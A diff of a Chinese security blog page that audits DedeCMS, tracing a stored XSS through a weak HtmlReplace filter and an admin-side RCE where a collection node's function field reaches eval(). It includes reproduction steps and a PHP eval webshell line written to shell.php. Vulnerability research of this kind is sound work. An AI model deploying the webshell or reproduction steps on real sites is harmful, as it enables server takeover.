-            <button class="toggle-btn" id="btn-code-1779933344377728700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344377728700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699551725000" title="Toggle" aria-expanded="false" aria-controls="code-1779947699551725000" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344377728700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699551725000-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -810,7 +806,7 @@ document.addEventListener('DOMContentLoaded', () => {
 <h3 id="body-的处理">$body 的处理<a hidden class="anchor" aria-hidden="true" href="#body-的处理">#</a></h3>
 <p>知道了过滤函数后，需要对用户输入的数据进行分析，判断其如何处理、如何绕过过滤函数。</p>
 <p>找到对 $body 参数的处理，同样调用了 HtmlReplace 函数，过滤模式为 仅替换 html 危险的标记</p>
-<div class="code-block-container" id="code-1779933344377728700" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344377728700">
+<div class="code-block-container" id="code-1779947699552221600" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699552221600">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -822,12 +818,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344377728700" title="Toggle" aria-expanded="false" aria-controls="code-1779933344377728700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699552221600" title="Toggle" aria-expanded="false" aria-controls="code-1779947699552221600" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344377728700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699552221600-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -837,13 +833,13 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span><span class="line"><span class="cl"><span class="nv">$body</span> <span class="o">=</span> <span class="nx">HtmlReplace</span><span class="p">(</span><span class="nv">$body</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917942.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917942.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p><code>$body = AnalyseHtmlBody($body, $description);</code>这一步是对<!-- raw HTML omitted -->HTML文本、自动摘要、自动获取缩略图等进行处理，不涉及 XSS 过滤<!-- raw HTML omitted --></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917862.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917862.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>之后进入：<code>$body = HtmlReplace($body, -1);</code></p>
 <p>在此模式下仅过滤 script/link/meta/ifr/fra，所以 XSS 还是有希望的</p>
 <p>然后 $body 被存入数据库（附加表），并且可以携带恶意代码：</p>
-<div class="code-block-container" id="code-1779933344378237100" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344378237100">
+<div class="code-block-container" id="code-1779947699552718300" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699552718300">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -855,12 +851,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344378237100" title="Toggle" aria-expanded="false" aria-controls="code-1779933344378237100" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699552718300" title="Toggle" aria-expanded="false" aria-controls="code-1779947699552718300" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344378237100-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699552718300-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -868,7 +864,7 @@ document.addEventListener('DOMContentLoaded', () => {
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="nv">$inquery</span> <span class="o">=</span> <span class="s2">&#34;INSERT INTO `</span><span class="si">{</span><span class="nv">$addtable</span><span class="si">}</span><span class="s2">`(aid,typeid,userip,redirecturl,templet,body</span><span class="si">{</span><span class="nv">$inadd_f</span><span class="si">}</span><span class="s2">) Values(&#39;</span><span class="si">$arcID</span><span class="s2">&#39;,&#39;</span><span class="si">$typeid</span><span class="s2">&#39;,&#39;</span><span class="si">$userip</span><span class="s2">&#39;,&#39;&#39;,&#39;&#39;,&#39;</span><span class="si">$body</span><span class="s2">&#39;</span><span class="si">{</span><span class="nv">$inadd_v</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918947.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918947.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>最后当我们去访问文章时，<code>plus/view.php?aid={id}</code>该路径从数据库进行读取，在前端进行渲染，触发 XSS 代码。</p>
 <h3 id="总结漏洞利用链">总结漏洞利用链<a hidden class="anchor" aria-hidden="true" href="#总结漏洞利用链">#</a></h3>
 <ol>
@@ -914,18 +910,18 @@ document.addEventListener('DOMContentLoaded', () => {
 <h1 id="漏洞-2---后台-rce">漏洞 2 - 后台 RCE<a hidden class="anchor" aria-hidden="true" href="#漏洞-2---后台-rce">#</a></h1>
 <h2 id="漏洞复现-1">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现-1">#</a></h2>
 <p>来到后台 - 采集 - 采集节点管理 - 增加新节点</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918908.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
-<p><img decoding="async" height="841" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918551.png" style="max-width: 100%; height: auto; aspect-ratio: 1361 / 841;" width="1361"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918908.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="841" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918551.png" style="max-width: 100%; height: auto; aspect-ratio: 1361 / 841;" width="1361"></p>
 <p>其他内容随意填写，<strong>编码要选择 UTF8</strong></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915513.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915513.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>保存信息</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917498.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917498.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>预览网址：</p>
 <p>预览网址的域名必须和 DedeCMS 站点一致，路径可以随便写（404 也行），但域名不能错。</p>
-<p>比如我的站点是 <a href="http://dedecms:9876">http://dedecms:9876</a>，那预览网址就填： <a href="http://dedecms:9876/test.html">http://dedecms:9876/test.html</a></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916241.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p>比如我的站点是 <a href="http://dedecms:9876" target="_blank" rel="noopener noreferrer">http://dedecms:9876</a>，那预览网址就填： <a href="http://dedecms:9876/test.html" target="_blank" rel="noopener noreferrer">http://dedecms:9876/test.html</a></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916241.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>自定义处理接口 要写入 webshell</p>
-<div class="code-block-container" id="code-1779933344378237100" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344378237100">
+<div class="code-block-container" id="code-1779947699553215000" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699553215000">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -937,12 +933,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344378237100" title="Toggle" aria-expanded="false" aria-controls="code-1779933344378237100" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699553215000" title="Toggle" aria-expanded="false" aria-controls="code-1779947699553215000" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344378237100-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699553215000-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -969,7 +965,7 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><div class="code-block-container" id="code-1779933344378237100" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344378237100">
+</div><div class="code-block-container" id="code-1779947699553711500" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699553711500">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -981,12 +977,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344378237100" title="Toggle" aria-expanded="false" aria-controls="code-1779933344378237100" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699553711500" title="Toggle" aria-expanded="false" aria-controls="code-1779947699553711500" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344378237100-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699553711500-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -996,19 +992,19 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php @eval($_POST[&#34;cmd&#34;]); ?&gt;&#39;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917776.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917776.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>保存配置并预览：成功上传 shell.php</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915212.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560">
-<img decoding="async" height="836" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918720.png" style="max-width: 100%; height: auto; aspect-ratio: 1195 / 836;" width="1195"></p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915470.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915212.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560">
+<img decoding="async" height="836" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070918720.png" style="max-width: 100%; height: auto; aspect-ratio: 1195 / 836;" width="1195"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915470.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <h2 id="漏洞分析-1">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析-1">#</a></h2>
 <h3 id="通过搜索危险函数确定入口点">通过搜索危险函数确定入口点<a hidden class="anchor" aria-hidden="true" href="#通过搜索危险函数确定入口点">#</a></h3>
 <p>在 php 代码的审计中，当然不可能一行一行代码的看过去，所以对危险函数进行搜索至关重要。</p>
 <p>那么通过搜索<code>eval(</code>，找到 uploads/include/dedecollection.class.php 文件：</p>
 <p><code>eval()</code> 是 PHP 中最危险的函数之一，能执行任意代码。发现它就要追问：$phpcode 从哪来？用户能控制吗？并且此处的 eval  仅做变量替换，无任何安全过滤</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915206.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915206.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>追踪函数<code>RunPHP()</code></p>
-<div class="code-block-container" id="code-1779933344378237100" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344378237100">
+<div class="code-block-container" id="code-1779947699553711500" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699553711500">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1020,12 +1016,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344378237100" title="Toggle" aria-expanded="false" aria-controls="code-1779933344378237100" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699553711500" title="Toggle" aria-expanded="false" aria-controls="code-1779947699553711500" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344378237100-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699553711500-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -1034,24 +1030,24 @@ document.addEventListener('DOMContentLoaded', () => {
 </div>
 </div></div>
 </div><p>显然参数 $phpcode 对应的是 $sarr[&lsquo;f&rsquo;]，继续寻找 $sarr[&lsquo;f&rsquo;] 的来源</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917777.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917777.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>$sarr 来自 $tmpLtKeys</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916705.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916705.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>继续寻找 $sarr 发现是 artNotes</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915217.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070915217.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>因为 $sarr[&lsquo;function&rsquo;] 参数还有一个 function，所以 artNotes 也应该提供 function，继续进行搜索<code>function</code></p>
 <p>找到 LoadItemConfig 函数，也就是从 $configString 字符串中解析出来的 function</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917689.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917689.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>继续跟进 LoadItemConfig 函数，发现是从数据库里载入了一个节点</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916234.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916234.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>现在已经明确：<code>$configString</code> 就是数据库表 <code>#@__co_note</code> 的 <code>itemconfig</code>字段。</p>
 <h3 id="追踪谁向数据库写入了-itemconfig">追踪谁向数据库写入了 itemconfig<a hidden class="anchor" aria-hidden="true" href="#追踪谁向数据库写入了-itemconfig">#</a></h3>
 <p>下一步就是去找哪里向数据库写入了 <code>itemconfig</code></p>
 <p>全局搜索谁对 co_note 表的 itemconfig 做了 INSERT 或 UPDATE：</p>
-<p><img decoding="async" height="1260" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916217.png" style="max-width: 100%; height: auto; aspect-ratio: 1812 / 1260;" width="1812"></p>
+<p><img decoding="async" height="1260" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916217.png" style="max-width: 100%; height: auto; aspect-ratio: 1812 / 1260;" width="1812"></p>
 <p>uploads/dede/co_add.php</p>
 <p>关键代码：</p>
-<div class="code-block-container" id="code-1779933344379314000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344379314000">
+<div class="code-block-container" id="code-1779947699554208500" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699554208500">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1063,12 +1059,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344379314000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344379314000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699554208500" title="Toggle" aria-expanded="false" aria-controls="code-1779947699554208500" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344379314000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699554208500-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span></code></pre></td>
@@ -1077,12 +1073,12 @@ document.addEventListener('DOMContentLoaded', () => {
 </div>
 </div></div>
 </div><p><code> $GLOBALS[&quot;function_&quot;.$field]</code> 直接对应用户 POST 提交的表单参数 <code>function_title</code>、<code>function_body</code> 等，没有任何过滤，直接拼入 <code>itemconfig</code> 存入数据库。
-<img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917924.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070917924.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>用户 POST function_xxx → co_add.php 拼接 → 写入 DB itemconfig → LoadItemConfig 解析 → artNotes[&lsquo;function&rsquo;] → RunPHP() → eval()</p>
 <p>从 eval() 一路回溯到用户输入，中间零过滤，这一条链路的分析已经完成。</p>
 <h3 id="写入点分析">写入点分析<a hidden class="anchor" aria-hidden="true" href="#写入点分析">#</a></h3>
 <p>全局搜索 itemconfig 时搜出了多个写入点，<code>co_edit.php、co_edit_text.php、co_get_corule.php</code> 属于同一个漏洞的不同触发路径</p>
-<div class="code-block-container" id="code-1779933344379314000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344379314000">
+<div class="code-block-container" id="code-1779947699554706500" data-expanded="false" role="region" aria-labelledby="btn-code-1779947699554706500">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -1094,12 +1090,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779933344379314000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344379314000" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779947699554706500" title="Toggle" aria-expanded="false" aria-controls="code-1779947699554706500" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779933344379314000-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779947699554706500-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
 </span><span class="lnt" id="2"><span class="lnlinks">2</span>
@@ -1109,11 +1105,11 @@ document.addEventListener('DOMContentLoaded', () => {
 </span></span><span class="line"><span class="cl">CheckPurview(&#39;co_AddNote&#39;);</span></span></code></pre></td></tr></table>
 </div>
 </div></div>
-</div><p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916397.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+</div><p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916397.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>step=5  拼接字符串 $itemconfig，其中直接包含用户提交的 function_ 字段内容</p>
-<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916788.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
+<p><img decoding="async" height="1528" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603070916788.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>引入类文件</p>
